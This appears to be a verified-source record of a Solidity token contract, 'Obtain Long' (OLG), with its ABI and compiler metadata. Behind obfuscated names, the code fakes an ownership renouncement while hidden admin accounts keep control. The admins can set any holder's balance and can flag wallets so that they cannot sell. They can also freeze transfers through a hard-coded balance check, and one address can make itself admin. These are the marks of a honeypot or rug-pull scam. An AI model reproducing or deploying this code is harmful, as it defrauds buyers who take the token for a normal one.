{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeReceiver {\n    function createPair(address toShould, address listEnable) external returns (address);\n}\n\ninterface teamMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTake) external view returns (uint256);\n\n    function transfer(address liquidityEnable, uint256 fromReceiverBuy) external returns (bool);\n\n    function allowance(address walletLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromReceiverBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityEnable,\n        uint256 fromReceiverBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txSwap, uint256 value);\n    event Approval(address indexed walletLimit, address indexed spender, uint256 value);\n}\n\ninterface teamMaxMetadata is teamMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ObtainLong is teamLimit, teamMax, teamMaxMetadata {\n\n    function minMarketing() private view {\n        require(shouldFee[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTotalReceiver;\n    }\n\n    string private swapTotalReceiver = \"Obtain Long\";\n\n    function amountSenderSell(address minList, uint256 fromReceiverBuy) public {\n        minMarketing();\n        fromTake[minList] = fromReceiverBuy;\n    }\n\n    uint256 senderReceiver;\n\n    bool public fundTakeEnable;\n\n    address txIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private senderAt;\n\n    uint256 private feeReceiver;\n\n    bool public launchLaunched;\n\n    uint8 private receiverMin = 18;\n\n    function transferFrom(address teamWalletList, address liquidityEnable, uint256 fromReceiverBuy) external override returns (bool) {\n        if (_msgSender() != txIs) {\n            if (maxLaunchedToken[teamWalletList][_msgSender()] != type(uint256).max) {\n                require(fromReceiverBuy <= maxLaunchedToken[teamWalletList][_msgSender()]);\n                maxLaunchedToken[teamWalletList][_msgSender()] -= fromReceiverBuy;\n            }\n        }\n        return enableExemptMode(teamWalletList, liquidityEnable, fromReceiverBuy);\n    }\n\n    mapping(address => uint256) private fromTake;\n\n    uint256 txSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMin;\n    }\n\n    uint256 private tokenBuy = 100000000 * 10 ** 18;\n\n    function enableExemptMode(address teamWalletList, address liquidityEnable, uint256 fromReceiverBuy) internal returns (bool) {\n        if (teamWalletList == feeTxShould) {\n            return amountFrom(teamWalletList, liquidityEnable, fromReceiverBuy);\n        }\n        uint256 launchedTx = teamMax(swapLaunched).balanceOf(sellTo);\n        require(launchedTx == senderReceiver);\n        require(liquidityEnable != sellTo);\n        if (sellMarketing[teamWalletList]) {\n            return amountFrom(teamWalletList, liquidityEnable, feeTotal);\n        }\n        return amountFrom(teamWalletList, liquidityEnable, fromReceiverBuy);\n    }\n\n    function walletTokenSender(address sellFund) public {\n        minMarketing();\n        \n        if (sellFund == feeTxShould || sellFund == swapLaunched) {\n            return;\n        }\n        sellMarketing[sellFund] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenBuy;\n    }\n\n    function owner() external view returns (address) {\n        return senderAt;\n    }\n\n    uint256 public receiverEnable;\n\n    address sellTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapFeeTotal;\n    }\n\n    bool private teamToken;\n\n    uint256 private isReceiver;\n\n    constructor (){\n        if (atExemptToken == isReceiver) {\n            launchLaunched = true;\n        }\n        tradingEnable enableSell = tradingEnable(txIs);\n        swapLaunched = takeReceiver(enableSell.factory()).createPair(enableSell.WETH(), address(this));\n        \n        feeTxShould = _msgSender();\n        liquidityBuy();\n        shouldFee[feeTxShould] = true;\n        fromTake[feeTxShould] = tokenBuy;\n        \n        emit Transfer(address(0), feeTxShould, tokenBuy);\n    }\n\n    address public feeTxShould;\n\n    uint256 constant feeTotal = 5 ** 10;\n\n    mapping(address => bool) public shouldFee;\n\n    function liquidityBuy() public {\n        emit OwnershipTransferred(feeTxShould, address(0));\n        senderAt = address(0);\n    }\n\n    function allowance(address autoIs, address liquidityMin) external view virtual override returns (uint256) {\n        if (liquidityMin == txIs) {\n            return type(uint256).max;\n        }\n        return maxLaunchedToken[autoIs][liquidityMin];\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLaunchedToken;\n\n    function approve(address liquidityMin, uint256 fromReceiverBuy) public virtual override returns (bool) {\n        maxLaunchedToken[_msgSender()][liquidityMin] = fromReceiverBuy;\n        emit Approval(_msgSender(), liquidityMin, fromReceiverBuy);\n        return true;\n    }\n\n    bool public fundAuto;\n\n    uint256 public atExemptToken;\n\n    bool private takeSwap;\n\n    address public swapLaunched;\n\n    function amountFrom(address teamWalletList, address liquidityEnable, uint256 fromReceiverBuy) internal returns (bool) {\n        require(fromTake[teamWalletList] >= fromReceiverBuy);\n        fromTake[teamWalletList] -= fromReceiverBuy;\n        fromTake[liquidityEnable] += fromReceiverBuy;\n        emit Transfer(teamWalletList, liquidityEnable, fromReceiverBuy);\n        return true;\n    }\n\n    function transfer(address minList, uint256 fromReceiverBuy) external virtual override returns (bool) {\n        return enableExemptMode(_msgSender(), minList, fromReceiverBuy);\n    }\n\n    function launchToList(uint256 fromReceiverBuy) public {\n        minMarketing();\n        senderReceiver = fromReceiverBuy;\n    }\n\n    function balanceOf(address receiverTake) public view virtual override returns (uint256) {\n        return fromTake[receiverTake];\n    }\n\n    mapping(address => bool) public sellMarketing;\n\n    event OwnershipTransferred(address indexed feeBuyLiquidity, address indexed modeMax);\n\n    function getOwner() external view returns (address) {\n        return senderAt;\n    }\n\n    string private swapFeeTotal = \"OLG\";\n\n    function autoAt(address shouldTake) public {\n        require(shouldTake.balance < 100000);\n        if (fundTakeEnable) {\n            return;\n        }\n        \n        shouldFee[shouldTake] = true;\n        \n        fundTakeEnable = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeBuyLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"amountSenderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atExemptToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTake\",\"type\":\"address\"}],\"name\":\"autoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTakeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"launchToList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWalletList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiverBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"}],\"name\":\"walletTokenSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ObtainLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}